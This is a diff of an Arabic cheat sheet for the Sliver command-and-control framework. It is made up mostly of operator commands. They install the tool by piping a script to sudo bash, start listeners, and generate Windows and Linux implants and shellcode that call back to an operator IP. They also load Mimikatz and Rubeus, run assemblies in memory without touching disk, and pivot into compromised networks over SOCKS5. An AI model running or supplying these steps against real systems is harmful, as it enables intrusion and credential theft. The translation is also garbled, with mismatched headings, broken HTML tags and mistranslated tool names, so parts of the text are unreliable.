@@ -1,12 +1,16 @@
-# ⚔️ Sliver — ورقة مرجعية شاملة
-
 <!-- language-home-navigation -->
 [🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# ⚔️ Sliver C2 - ورقة الغش الكاملة
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
   ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
@@ -16,54 +20,53 @@
   ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
        Modern Open-Source Command & Control (C2) Framework by Bishop Fox
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
-  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
+  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="الأسقف فوكس">
   <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
-  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Red Team">
-</p>
+  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="الفريق الأحمر">
+</ص>
 
 <p align="center">
-  <b>⚔️ Modern, cross-platform, open-source adversary emulation and Command & Control framework supporting mTLS, WireGuard, HTTP(S), and DNS protocols</b>
-</p>
+  <b>⚔️ محاكاة حديثة ومتعددة المنصات ومفتوحة المصدر للخصم وإطار عمل للتحكم والتحكم يدعم بروتوكولات mTLS وWireGuard وHTTP(S) وDNS</b>
+</ص>
 
 ---
 
 ## 📋 جدول المحتويات
 
-- [مقدمة](#-overview--architecture)
-- [التثبيت](#-installation--server-setup)
-  - [Multiplayer Architecture**: Real-time collaboration between multiple red team operators via cryptographically signed operator profiles.](#automated-one-liner-install)
-  - [نصائح وأفضل الممارسات](#multiplayer-operator-configuration)
-- [Listener Configuration (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
-- [Generating Implants (Beacons vs Sessions)](#-generating-implants-beacons-vs-sessions)
-  - [Interactive Sessions vs Asynchronous Beacons](#interactive-sessions-vs-asynchronous-beacons)
-  - [🚀 Generating Implants (Beacons vs Sessions)](#windows-exe--shellcode-implants)
-  - [Session**: Real-time TCP/TLS connection with instantaneous command response. Higher network visibility.](#linux--macos-elf-implants)
-- [Post-Exploitation & Armory Ecosystem](#-post-exploitation--armory-ecosystem)
-  - [Installing Armory Extensions (BOFs, Donut, Seatbelt)](#installing-armory-extensions-bofs-donut-seatbelt)
-  - [Credential Access & Mimikatz](#credential-access--mimikatz)
-  - [The Armory is Sliver's integrated package manager for third-party offensive tools and Cobalt Strike Beacon Object Files (BOFs):](#pivoting--dynamic-socks5)
-- [مرجع سريع](#-quick-reference-table)
-- [Defensive Considerations & Detection](#-defensive-considerations--detection)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [نظرة عامة والهندسة المعمارية](#-نظرة عامة--الهندسة المعمارية)
+- [التثبيت وإعداد الخادم](#-التثبيت--إعداد الخادم)
+  - [التثبيت التلقائي للخط الواحد](#التثبيت التلقائي للخط الواحد)
+  - [تكوين مشغل متعدد اللاعبين](#multiplayer-operator-configuration)
+- [تكوين المستمع (mTLS، HTTP، WireGuard، DNS)](#-listener-configuration-mtls-http-wireguard-dns)
+- [توليد المنارات مقابل الجلسات)](#-توليد المنارات مقابل الجلسات)
+  - [الجلسات التفاعلية مقابل الإشارات غير المتزامنة](#interactive-sessions-vs-as-asynchronous-beacons)
+  - [Windows EXE وزرعات Shellcode](#windows-exe--shellcode-implants)
+  - [عمليات زرع Linux وmacOS ELF](#linux--macos-elf-implants)
+- [النظام البيئي لمرحلة ما بعد الاستغلال ومستودع الأسلحة](#-النظام البيئي لمرحلة ما بعد الاستغلال--النظام البيئي لمستودع الأسلحة)
+  - [تثبيت ملحقات مستودع الأسلحة (BOFs، الكعك، حزام الأمان)](#installing-armory-extensions-bofs-donut-seatbelt)
+  - [الوصول إلى بيانات الاعتماد وMimikatz](#credential-access--mimikatz)
+  - [التمحور والديناميكي SOCKS5](#التمحور--dynamic-socks5)
+- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
+- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
+- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
 
 ---
 
-## 🎯 مقدمة
+## 🎯 نظرة عامة والهندسة المعمارية
 
-Engineered in Go by **Bishop Fox**, **Sliver** is one of the premier open-source alternatives to commercial C2 frameworks (Cobalt Strike, Brute Ratel):
-- **Cross-Platform**: Server and implants support Windows, Linux, and macOS across `x86_64`, `arm64`, and `arm`.
-- **Evasive Communication**: Out-of-the-box support for mutual TLS (mTLS), WireGuard UDP tunnels, HTTP/HTTPS with procedural canary generation, and DNS tunneling.
-- **In-Memory Execution**: Native reflective DLL injection, Beacon Object Files (BOFs), inline .NET execution via Donut, and process hollowing.
-- **Multiplayer Architecture**: Real-time collaboration between multiple red team operators via cryptographically signed operator profiles.
+تم تصميم **Sliver** في Go بواسطة **Bishop Fox**، وهو أحد البدائل الرائدة مفتوحة المصدر لأطر عمل C2 التجارية (Cobalt Strike، Brute Ratel):
+- **النظام الأساسي المشترك:** يدعم الخادم والمزروعات أنظمة التشغيل Windows وLinux وmacOS عبر `x86_64` و`arm64` و`arm`.
+- **الاتصال المراوغ:** دعم خارج الصندوق لـ TLS المتبادل (mTLS)، وأنفاق WireGuard UDP، وHTTP/HTTPS مع إنشاء الكناري الإجرائي، ونفق DNS.
+- **التنفيذ داخل الذاكرة:** حقن DLL العاكس الأصلي، وملفات كائنات المنارة (BOFs)، وتنفيذ .NET المضمن عبر Donut، وتجويف العملية.
+- **بنية متعددة اللاعبين:** تعاون في الوقت الفعلي بين العديد من مشغلي الفريق الأحمر عبر ملفات تعريف المشغلين الموقعة بالتشفير.
 
 ---
 
-## 📥 التثبيت
+## 📥 التثبيت وإعداد الخادم
 
-### Multiplayer Architecture**: Real-time collaboration between multiple red team operators via cryptographically signed operator profiles.
+### التثبيت الآلي للخط الواحد
 ```bash
 # Download and install sliver-server and sliver-client
 curl -s https://sliver.sh/install | sudo bash
@@ -71,9 +74,8 @@ curl -s https://sliver.sh/install | sudo bash
 # Start the Sliver background daemon
 sudo systemctl enable --now sliver
 ```
-
-### نصائح وأفضل الممارسات
-📥 التثبيت
+### تكوين مشغل متعدد اللاعبين
+قم بإنشاء ملف تعريف المشغل على خادم C2 لأحد أعضاء الفريق:
 ```bash
 # On the C2 server
 sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver
@@ -82,13 +84,11 @@ sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliv
 sliver-client import /path/to/alice.sliver
 sliver-client
 ```
-
 ---
 
-## 🎧 Listener Configuration (mTLS, HTTP, WireGuard, DNS)
+## 🎧 تكوين المستمع (mTLS، HTTP، WireGuard، DNS)
 
-Inside the `sliver` console:
-
+داخل وحدة التحكم `sliver`:
 ```text
 # Start mutual TLS listener on port 8888
 [sliver] > mtls --lport 8888
@@ -102,16 +102,15 @@ Inside the `sliver` console:
 # Verify running listeners
 [sliver] > jobs
 ```
-
 ---
 
-## 🚀 Generating Implants (Beacons vs Sessions)
+## 🚀 توليد الغرسات (المنارات مقابل الجلسات)
 
-### Interactive Sessions vs Asynchronous Beacons
-- **Session**: Real-time TCP/TLS connection with instantaneous command response. Higher network visibility.
-- **Beacon**: Asynchronous heartbeat that sleeps for intervals with randomized jitter. Dramatically harder for SOCs to identify via network anomaly analysis.
+### الجلسات التفاعلية مقابل الإشارات غير المتزامنة
+- **الجلسة:** اتصال TCP/TLS في الوقت الفعلي مع استجابة فورية للأوامر. رؤية أعلى للشبكة.
+- **المرشد:** نبض قلب غير متزامن ينام لفترات زمنية مع اهتزاز عشوائي. يصعب بشكل كبير على SOCs التعرف على تحليل الشذوذ في الشبكة.
 
-### 🚀 Generating Implants (Beacons vs Sessions)
+### عمليات زرع Windows EXE وShellcode
 ```text
 # Generate a Windows x64 interactive mTLS session implant
 [sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe
@@ -122,19 +121,17 @@ Inside the `sliver` console:
 # Generate raw x64 position-independent shellcode
 [sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
 ```
-
-### Session**: Real-time TCP/TLS connection with instantaneous command response. Higher network visibility.
+### عمليات زرع Linux وmacOS ELF
 ```text
 # Linux x64 ELF binary
 [sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
 ```
-
 ---
 
-## 🛠️ Post-Exploitation & Armory Ecosystem
+## 🛠️ النظام البيئي لمرحلة ما بعد الاستغلال ومستودع الأسلحة
 
-### Installing Armory Extensions (BOFs, Donut, Seatbelt)
-The Armory is Sliver's integrated package manager for third-party offensive tools and Cobalt Strike Beacon Object Files (BOFs):
+### تثبيت ملحقات مستودع الأسلحة (BOFs، الدونات، حزام الأمان)
+The Armory هو مدير الحزم المتكامل من Sliver للأدوات الهجومية التابعة لجهات خارجية وملفات كائنات Cobalt Strike Beacon (BOFs):
 ```text
 # Update package list
 [sliver] > armory update
@@ -145,8 +142,7 @@ The Armory is Sliver's integrated package manager for third-party offensive tool
 [sliver] > armory install rubeus
 [sliver] > armory install mimikatz
 ```
-
-### 🛠️ Post-Exploitation & Armory Ecosystem
+### التفاعل مع الجلسات والإشارات
 ```text
 # List active sessions
 [sliver] > sessions
@@ -163,9 +159,8 @@ The Armory is Sliver's integrated package manager for third-party offensive tool
 # Execute .NET assembly in-memory without touching disk
 [sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
 ```
-
-### The Armory is Sliver's integrated package manager for third-party offensive tools and Cobalt Strike Beacon Object Files (BOFs):
-Route external offensive tools directly into the compromised target network:
+### الجوارب المحورية والديناميكية5
+قم بتوجيه الأدوات الهجومية الخارجية مباشرة إلى الشبكة المستهدفة المخترقة:
 ```text
 # Start SOCKS5 proxy on local port 1080 of the C2 client
 [sliver] (session) > socks5 start --port 1080
@@ -173,33 +168,32 @@ Route external offensive tools directly into the compromised target network:
 # Check active pivots
 [sliver] > pivots
 ```
+---
+
+## ⚡ جدول مرجعي سريع
+
+| الهدف | الأمر |
+|-----------|--------|
+| **بدء تشغيل مستمع mTLS** | `mtls --lport 8888` |
+| **بدء تشغيل مستمع HTTPS** | `https --lport 443 --domain c2.domain.com` |
+| ** إنشاء جلسة EXE ** | `generate --mtls <IP>:8888 --os windows -f exe` |
+| ** إنشاء منارة EXE ** | `generate beacon --http <URL> --seconds 60 -f exe` |
+| ** إنشاء كود القشرة الخام ** | `generate --mtls <IP>:8888 -f shellcode` |
+| ** قائمة الجلسات والتفاعل معها **| `sessions` -> `use <ID>` |
+| ** تثبيت أدوات مستودع الأسلحة ** | `armory install seatbelt mimikatz` |
+| **تنفيذ .NET داخل الذاكرة**| `execute-assembly /path/to/binary.exe <args>` |
+| ** الوكيل العكسي SOCKS5 ** | `socks5 start --port 1080` |
 
 ---
 
-## ⚡ مرجع سريع
+## 🛡️ الاعتبارات الدفاعية والكشوفات
 
-|Objective|الأمر|
-|-----------|---------|
-|**Start mTLS Listener**|`mtls --lport 8888`|
-|**Start HTTPS Listener**|`https --lport 443 --domain c2.domain.com`|
-|**Generate Session EXE**|`generate --mtls <IP>:8888 --os windows -f exe`|
-|**Generate Beacon EXE**|`generate beacon --http <URL> --seconds 60 -f exe`|
-|**Generate Raw Shellcode**|`generate --mtls <IP>:8888 -f shellcode`|
-|**List & Interact Sessions**|`sessions` -> `use <ID>`|
-|**Install Armory Tools**|`armory install seatbelt mimikatz`|
-|**In-Memory .NET Execution**|`execute-assembly /path/to/binary.exe <args>`|
-|**SOCKS5 Reverse Proxy**|`socks5 start --port 1080`|
+1. ** JARM Fingerprinting: ** يمكن تحديد ملفات تعريف مستمعي HTTP الافتراضيين باستخدام بصمات JARM TLS النشطة. تخصيص شفرات TLS في تكوين Sliver.
+2. **تحليل YARA والثنائي:** تحتوي عمليات الزرع الافتراضية التي تنتجها `generate` على بيانات تعريف Golang وهياكل الرموز ما لم يتم تشويشها عبر تشويه (`--skip-symbols`).
 
 ---
 
-## 🛡️ Defensive Considerations & Detection
+## ⚠️إخلاء المسؤولية القانونية
 
-1. **JARM Fingerprinting:** Default Sliver HTTP listeners can be profiled using active JARM TLS fingerprinting. Customize TLS ciphers in Sliver configuration.
-2. **YARA & Binary Analysis:** Default implants produced by `generate` contain Golang metadata and symbol structures unless obfuscated via garble (`--skip-symbols`).
-
----
-
-## ⚠️ Legal Disclaimer
-
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Sliver is an advanced adversary simulation and red team Command & Control framework. It must be deployed exclusively in authorized engagements with clear rules of engagement (RoE). Unauthorized use on third-party computers is strictly illegal.
+> [!تنبيه]
+> Sliver عبارة عن محاكاة متقدمة للخصم وإطار عمل للقيادة والتحكم للفريق الأحمر. ويجب نشره حصريًا في الاشتباكات المصرح بها مع قواعد اشتباك واضحة (RoE). يعد الاستخدام غير المصرح به على أجهزة الكمبيوتر التابعة لجهات خارجية أمرًا غير قانوني تمامًا.
